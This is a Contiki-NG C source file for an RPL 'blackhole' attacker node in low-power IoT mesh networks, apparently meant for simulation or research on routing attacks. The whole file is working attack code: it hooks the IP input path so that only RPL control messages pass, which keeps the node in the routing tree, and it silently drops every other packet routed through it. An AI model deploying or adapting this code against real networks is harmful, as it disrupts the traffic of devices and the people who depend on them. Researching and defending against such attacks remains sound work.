#include "contiki.h"
#include "net/routing/routing.h"
#include "random.h"
#include "net/netstack.h"
#include <stdint.h>
#include <inttypes.h>
#include "rpl.h"
#include "net/packetbuf.h"
#include "net/ipv6/uipbuf.h"
#include "net/ipv6/uip-icmp6.h"

#include "sys/log.h"
#define LOG_MODULE "App"
#define LOG_LEVEL LOG_LEVEL_INFO

#define WITH_SERVER_REPLY  1

/*---------------------------------------------------------------------------*/
PROCESS(decr_rank_attacker, "RPL UDP Blackhole");
AUTOSTART_PROCESSES(&decr_rank_attacker);

/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_input(void)
{
  uint8_t proto = 0;
  uipbuf_get_last_header(uip_buf, uip_len, &proto);
  LOG_INFO("Incoming packet proto: %d, from ", proto);
  LOG_INFO_6ADDR(&UIP_IP_BUF->srcipaddr);
  LOG_INFO_("\n");

  if ((proto == UIP_PROTO_ICMP6 && uip_buf[40] == ICMP6_RPL) || (proto == UIP_PROTO_HBHO && uip_buf[48] == ICMP6_RPL)) {
    LOG_INFO("Letting RPL packet pass !\n");
    return NETSTACK_IP_PROCESS;
  }
  LOG_INFO("Dropping packet !\n");
  return NETSTACK_IP_DROP;
}
/*---------------------------------------------------------------------------*/
static enum netstack_ip_action
ip_output(const linkaddr_t *localdest)
{
  return NETSTACK_IP_PROCESS;
}
/*---------------------------------------------------------------------------*/
struct netstack_ip_packet_processor packet_processor = {
  .process_input = ip_input,
  .process_output = ip_output
};
/*---------------------------------------------------------------------------*/

/*---------------------------------------------------------------------------*/
PROCESS_THREAD(decr_rank_attacker, ev, data)
{
  PROCESS_BEGIN();

  netstack_ip_packet_processor_add(&packet_processor);

  while (1) {
    PROCESS_YIELD();
  }

  PROCESS_END();
}
/*---------------------------------------------------------------------------*/
